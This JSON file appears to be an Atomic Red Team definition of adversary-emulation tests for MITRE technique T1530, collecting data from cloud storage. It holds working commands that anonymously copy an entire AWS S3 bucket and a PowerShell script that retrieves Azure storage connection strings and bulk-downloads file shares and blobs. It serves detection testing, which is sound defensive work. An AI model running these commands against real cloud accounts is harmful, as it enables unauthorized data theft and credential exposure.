{
  "attack_technique": "T1530",
  "display_name": "Data from Cloud Storage Object",
  "atomic_tests": [
    {
      "name": "AWS - Scan for Anonymous Access to S3",
      "description": "Upon successful execution, this test will test for anonymous access to AWS S3 buckets and dumps all the files to a local folder.",
      "supported_platforms": [
        "iaas:aws"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "command": "aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}",
        "cleanup_command": "aws s3 rb s3://#{s3_bucket_name} --force \nrm -rf /tmp/#{s3_bucket_name}"
      },
      "input_arguments": {
        "s3_bucket_name": {
          "description": "Name of the bucket",
          "type": "string",
          "default": "redatomic-test2"
        }
      },
      "dependencies": [
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured",
          "prereq_command": "cat ~/.aws/credentials | grep \"default\"\naws s3api create-bucket --bucket #{s3_bucket_name}\naws s3api put-bucket-policy --bucket #{s3_bucket_name} --policy file://$PathToAtomicsFolder/T1530/src/policy.json\ntouch /tmp/T1530.txt\naws s3 cp /tmp/T1530.txt s3://#{s3_bucket_name}",
          "get_prereq_command": "echo Please install the aws-cli and configure your AWS default profile using: aws configure"
        }
      ],
      "auto_generated_guid": "979356b9-b588-4e49-bba4-c35517c484f5"
    },
    {
      "name": "Azure - Dump Azure Storage Account Objects via Azure CLI",
      "description": "This test dumps the content of the storage account objects present in the file defined in file_shares_csv_file_path. Note that this file is created in the atomic test T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\". When created manually, it must contain the columns \"ResourceGroup\",\"StorageAccountName\", \"FileShareName\", \"ContainerName\", \"BlobName\".\n\nRequirements:\n    - The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n    - The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.",
      "supported_platforms": [
        "iaas:azure"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "$storage_account_objects = Import-Csv -Path \"#{storage_account_objects_csv_file_path}\"\n\n# Login to Azure\naz login\n\nif (-not (Test-Path -Path \"#{output_folder}\")) {\n    New-Item -ItemType Directory -Path \"#{output_folder}\"\n}\n\nforeach ($row in $storage_account_objects) {\n    \n    if ($row.FileShareName -ne \"\"){\n        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query \"allowSharedKeyAccess\"\n\n        if ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n            Write-Output \"Shared key access is disabled for this storage account.\"\n        } else {\n            Write-Output \"Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...\"\n            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv\n            \n            # Create folder for storage account objects\n            $storageAccountOutputPath = Join-Path #{output_folder} \"$($row.ResourceGroup)_$($row.StorageAccountName)\"\n            if (-not (Test-Path -Path $storageAccountOutputPath)) {\n                New-Item -ItemType Directory -Path $storageAccountOutputPath\n            }\n\n            # create folder for file share content\n            $fileSharePath = Join-Path -Path $storageAccountOutputPath $row.FileShareName\n            if (-not (Test-Path -Path $fileSharePath)) {\n                New-Item -ItemType Directory -Path $fileSharePath\n            }\n            az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath\n        }\n    } elseif ($row.ContainerName -ne \"\" -and $row.BlobName -eq \"\") {\n        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query \"allowSharedKeyAccess\"\n\n        if ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n            Write-Output \"Shared key access is disabled for this storage account.\"\n        } else {\n            Write-Output \"Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ...\"\n            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv\n            \n            # Create folder for storage account objects\n            $storageAccountOutputPath = Join-Path #{output_folder} \"$($row.ResourceGroup)_$($row.StorageAccountName)\"\n            if (-not (Test-Path -Path $storageAccountOutputPath)) {\n                New-Item -ItemType Directory -Path $storageAccountOutputPath\n            }\n\n            # create folder for blob content\n            $containerFolderPath = Join-Path $storageAccountOutputPath $row.ContainerName\n            if (-not (Test-Path -Path $containerFolderPath)) {\n                New-Item -ItemType Directory -Path $containerFolderPath\n            }\n            az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString\n        }\n    }\n}",
        "cleanup_command": "Remove-Item -Path \"#{output_folder}\" -Recurse -Force -erroraction silentlycontinue\nWrite-Output \"Removed #{output_folder}\""
      },
      "input_arguments": {
        "output_folder": {
          "description": "Folder path to output file share content to",
          "type": "path",
          "default": "$env:temp\\T1530_storage_account_objects"
        },
        "storage_account_objects_csv_file_path": {
          "description": "Path to file that contains all storage account objects in form of a csv file. This may be the result from Test T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\".",
          "type": "path",
          "default": "$env:temp\\T1619_storage_account_objects.csv"
        }
      },
      "dependencies": [
        {
          "description": "Azure CLI must be installed",
          "prereq_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
          "get_prereq_command": "Install-Module -Name Az -Force"
        }
      ],
      "auto_generated_guid": "67374845-b4c8-4204-adcc-9b217b65d4f1"
    }
  ]
}